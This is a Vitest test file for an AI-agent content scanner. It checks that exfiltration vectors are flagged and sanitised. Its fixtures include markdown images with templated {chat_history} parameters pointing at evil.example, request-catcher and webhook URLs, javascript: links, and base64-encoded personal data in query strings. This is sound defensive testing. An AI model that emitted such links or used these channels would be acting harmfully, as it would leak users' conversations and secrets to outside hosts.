import { describe, expect, it } from 'vitest';
import { scan } from '../src/index';

const find = (input: string, type: 'html' | 'markdown' | 'text', id: string) =>
  scan(input, { type }).findings.find((f) => f.id === id);

describe('exfiltration vectors', () => {
  it('flags a templated markdown image as critical', () => {
    const f = find('Summary ![x](https://evil.example/p.png?q={chat_history})', 'markdown', 'exfiltration/templated-url');
    expect(f?.severity).toBe('critical');
    expect(f?.url).toBe('https://evil.example/p.png?q={chat_history}');
  });

  it('flags a templated link as high', () => {
    expect(find('[click](https://evil.example/?d=${SECRET})', 'markdown', 'exfiltration/templated-url')?.severity).toBe('high');
  });

  it.each([
    ['webhook.site', 'https://webhook.site/0b7c1f3e-1234-4c0e-9a1b-abcdefabcdef'],
    ['requestbin', 'https://en5x1.x.pipedream.net/collect'],
    ['ngrok', 'https://a1b2-203-0-113-7.ngrok-free.app/log'],
    ['Discord webhook', 'https://discord.com/api/webhooks/123/abc'],
    ['Telegram bot API', 'https://api.telegram.org/bot123:ABC/sendMessage?chat_id=1&text=hi'],
    ['interactsh', 'https://c58bduhe008dovpvhvugcfemp9yyyyyyn.oast.fun/'],
  ])('flags %s', (_label, url) => {
    expect(find(`See ${url} for details`, 'text', 'exfiltration/webhook-host')).toBeDefined();
  });

  it('escalates a catcher image with a query string to critical', () => {
    expect(find('<img src="https://webhook.site/abc?d=1">', 'html', 'exfiltration/webhook-host')?.severity).toBe('critical');
  });

  it('flags dangerous data: and javascript: URLs', () => {
    expect(find('<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>', 'html', 'exfiltration/data-url')?.severity).toBe('high');
    expect(find('<a href="javascript:fetch(1)">x</a>', 'html', 'exfiltration/javascript-url')?.severity).toBe('high');
  });

  it('flags long encoded query payloads', () => {
    const payload = Buffer.from('user=alice@example.com; history=I told my doctor about my migraines; card=4111').toString('base64');
    expect(find(`![t](https://img.example/t.gif?d=${payload})`, 'markdown', 'exfiltration/encoded-query')?.severity).toBe('high');
  });

  it.each([
    ['badge', '[![npm](https://img.shields.io/npm/v/pkg.svg)](https://www.npmjs.com/package/pkg)'],
    ['signed S3 URL', `<img src="https://bucket.s3.amazonaws.com/a.png?X-Amz-Signature=${'ab12'.repeat(16)}&X-Amz-Expires=300">`],
    ['ordinary link', 'Docs live at https://example.com/docs?page=2.'],
    ['inline png', '<img src="data:image/png;base64,iVBORw0KGgo=">'],
  ])('ignores a benign %s', (_label, input) => {
    expect(scan(input).findings.filter((f) => f.category === 'exfiltration')).toEqual([]);
  });

  it('neutralises exfiltration URLs when sanitizing', () => {
    const r = scan('Hi ![a](https://webhook.site/x?q={data}) there', { type: 'markdown' });
    expect(r.sanitized).toBe('Hi [image removed by agentguard] there');
  });

  it('counts inspected URLs', () => {
    expect(scan('a https://a.example b https://b.example', { type: 'text' }).stats.urls).toBe(2);
  });
});
